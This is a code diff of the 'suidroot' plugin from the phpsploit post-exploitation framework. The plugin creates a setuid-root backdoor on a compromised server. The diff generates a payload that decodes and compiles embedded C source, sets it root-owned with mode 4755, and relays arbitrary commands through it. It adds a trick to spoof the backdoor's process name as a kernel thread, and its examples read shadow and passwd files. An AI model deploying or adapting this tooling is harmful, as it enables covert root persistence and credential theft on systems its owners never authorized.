@@ -1,17 +1,13 @@
 """Setuid backdoor handler
 
 SYNOPSIS:
-    suidroot --create <SUIDROOT_BACKDOOR> <SUIDROOT_PIPE>
+    suidroot --create <SUIDROOT_BACKDOOR>
     suidroot "<COMMAND>"
 
 DESCRIPTION:
     This plugin provides a simple way to install a setuid(2)
     backdoor, and use it for presistent privilege escalation
     through phpsploit.
-
-    Environment variables:
-    <SUIDROOT_BACKDOOR> - The setuid backdoor file to create
-    <SUIDROOT_PIPE> - The file used to store next command
 
     NOTES:
     - This plugin only performs root access persistance
@@ -34,7 +30,7 @@ WARNING:
       > run "echo 'foo bar' > /tmp/foobar; cat /etc/passwd"
 
 EXAMPLES:
-    > suidroot --create /tmp/backdoor /tmp/backdoor-batch.sh
+    > suidroot --create /tmp/backdoor
       - Generates the payload to be run as root in order
         to enable persistance through phpsploit
     > suidroot cat /tmp/shadow
@@ -45,8 +41,6 @@ EXAMPLES:
 ENVIRONMENT:
     * SUIDROOT_BACKDOOR
         The setuid(2) backdoor file
-    * SUIDROOT_PIPE
-        The SUIDROOT_BACKDOOR's command repsonse recipient
     * SUIDROOT_PWD
         Current working directory for privileged user
 
@@ -55,6 +49,10 @@ AUTHOR:
 """
 
 import sys
+import os
+import base64
+
+from core import encoding
 
 import ui.color
 import ui.input
@@ -63,7 +61,7 @@ from api import plugin
 from api import server
 from api import environ
 
-SUIDROOT_ENV_VARS = {"SUIDROOT_BACKDOOR", "SUIDROOT_PIPE", "SUIDROOT_PWD"}
+SUIDROOT_ENV_VARS = {"SUIDROOT_BACKDOOR", "SUIDROOT_PWD"}
 
 if environ["PLATFORM"].lower().startswith("win"):
     sys.exit("Plugin available on unix-based platforms only")
@@ -72,25 +70,20 @@ if len(plugin.argv) < 2:
     sys.exit(plugin.help)
 
 if plugin.argv[1] == '--create':
-    if len(plugin.argv) != 4:
+    if len(plugin.argv) != 3:
         sys.exit(plugin.help)
 
-    # the third arg determines this setuid file to use
     backdoor_file = server.path.abspath(plugin.argv[2])
-    pipe_file = server.path.abspath(plugin.argv[3])
-
-    suid_dir = server.path.dirname(backdoor_file)
 
     # create the payload that must be run as privileged used.
     # The suidroot backdoor is then created with suid byte
     # enabled, making tunnel available.
-    payload = ("echo -e 'main(){setuid(0);system(\"%p\");}'>%f;"
-               "gcc -x c -o %f %f;"
+    file = open(os.path.join(plugin.path, "backdoor.c"), 'rb')
+    source_code = encoding.decode(base64.b64encode(file.read()))
+    payload = ("echo %b | python -m base64 -d | gcc -o %f -x c -;"
                "chown root %f;"
                "chmod 4755 %f;"
-               "touch %p;"
-               "chmod 777 %p;" # write AND execution required for `others`
-               ).replace('%f', backdoor_file).replace('%p', pipe_file)
+               ).replace('%f', backdoor_file).replace('%b', source_code)
 
     # prevent previous configuration override
     if SUIDROOT_ENV_VARS.issubset(set(environ)):
@@ -103,7 +96,6 @@ if plugin.argv[1] == '--create':
     print(ui.color.colorize("\n", "%Blue", payload, "\n"))
 
     environ['SUIDROOT_BACKDOOR'] = backdoor_file
-    environ['SUIDROOT_PIPE'] = pipe_file
     environ['SUIDROOT_PWD'] = environ['PWD']
     sys.exit()
 
@@ -115,15 +107,23 @@ for var in SUIDROOT_ENV_VARS:
         sys.exit(msg % var)
 
 # build the command to send from given arguments
-command = 'cd ' + environ['SUIDROOT_PWD'] + '\n'  # goto exploit current dir
-command += (' '.join(plugin.argv[1:])) + '\n'  # the joined user arguments
-command += 'echo -e "\\nsuid" `pwd` suid' # token to make sure new pwd is known
+command = ' '.join(plugin.argv[1:]).strip()
+# chdir to SUIDROOT_PWD before
+if not command.startswith(";"):
+    command = " ; " + command
+command = 'cd ' + environ['SUIDROOT_PWD'] + command
+# token to make sure new pwd is known
+if not command.endswith(";"):
+    command += " ; "
+command += 'echo -e "\\nsuid" `pwd` suid' 
 
 # build the payload to send the command to run on system
 payload = server.payload.Payload("payload.php")
-payload['BACKDOOR'] = environ['SUIDROOT_BACKDOOR']
-payload['PIPE'] = environ['SUIDROOT_PIPE']
-payload['COMMAND'] = command
+# prepend slashes, so backdoor can spoof it's name with fake '[kthread]' str
+payload['BACKDOOR'] = "/////////" + environ['SUIDROOT_BACKDOOR']
+payload['COMMAND'] = repr(command)
+
+print("[#] raw command: %r" %command)
 
 output = payload.send()
 
